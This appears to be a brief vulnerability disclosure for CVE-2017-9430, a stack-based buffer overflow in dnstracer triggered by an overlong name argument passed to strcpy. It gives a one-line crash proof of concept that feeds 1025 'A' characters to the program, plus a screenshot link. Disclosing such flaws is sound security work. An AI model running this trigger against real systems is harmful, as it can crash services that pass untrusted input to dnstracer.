# i,am Gihad from Libya !!
--------------------------------------------
# DNSTracer-1.8.1---Buffer-Overflow
# CVE-2017-9430
# What Stack-based buffer overflow in dnstracer through 1.9 allows attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a command line with a long name argument that is mishandled in a strcpy call for argv[0]. An example threat model is a web application that launches dnstracer with an untrusted name string.
-----------------------------------------------------------------------------------------------------------------------------------------
# Description:  Stack-based buffer overflow in dnstracer through 1.9 allows 
attackers  to cause a denial of service (application crash) or possibly hav
e unspecified other impact via a command line with a long name argument tha
t is mishandled in a strcpy call for argv[0]. An example threat model is a 
web application that launches dnstracer with an untrusted name string
--------------------------------------------------------------------------------------------------------------------
Terminal:> dnstracer -v $(python -c 'print "A"*1025')

![screenshot from 2017-06-08 04-17-03](https://user-images.githubusercontent.com/25440152/26914979-5b847042-4c24-11e7-91dd-1be8450ee3f4.png)
